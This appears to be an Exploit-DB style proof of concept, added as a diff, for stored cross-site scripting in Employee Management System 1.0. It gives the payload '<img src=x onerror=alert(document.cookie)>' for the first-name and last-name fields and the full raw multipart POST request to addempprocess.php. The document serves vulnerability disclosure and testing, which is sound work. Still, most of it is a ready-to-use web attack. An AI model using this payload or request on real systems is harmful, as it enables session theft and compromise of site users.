@@ -1,0 +1,85 @@
+#Exploit Title: Employee Management System 1.0 - Stored Cross Site Scripting
+#Date: 2020-10-16
+#Exploit Author: Ankita Pal
+#Vendor Homepage: https://www.sourcecodester.com/php/14432/employee-management-system-using-php.html
+#Software Link: https://www.sourcecodester.com/sites/default/files/download/razormist/employee-management-system.zip
+#Version: 1.0
+#Tested on: Windows 10 + xampp v3.2.4
+
+
+Proof of Concept:::
+
+Step 1: Open the URL localhost:8081/Employee Management System/addemp.php
+
+Step 2: Use payload <img src=x onerror=alert(document.cookie)> in First Name and Last Name.
+
+
+Malicious Request:::
+
+POST /Employee%20Management%20System/////process/addempprocess.php HTTP/1.1
+Host: localhost:8081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------3267707159765331982713791736
+Content-Length: 1571
+Origin: http://localhost:8081
+Connection: close
+Referer: http://localhost:8081/Employee%20Management%20System/////addemp.php
+Cookie: PHPSESSID=infdfigld4et4jndfgbn33kcsv
+Upgrade-Insecure-Requests: 1
+
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="firstName"
+
+<img src=x onerror=alert(document.cookie)>
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="lastName"
+
+<img src=x onerror=alert(document.cookie)>
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="email"
+
+abc@gmail.com
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="birthday"
+
+2020-09-28
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="gender"
+
+Female
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="contact"
+
+9876543211
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="nid"
+
+12
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="address"
+
+Gujarat
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="dept"
+
+CS
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="degree"
+
+BE
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="salary"
+
+
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="file"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------3267707159765331982713791736--
+
+
+Cookie will be reflected on View Employee.
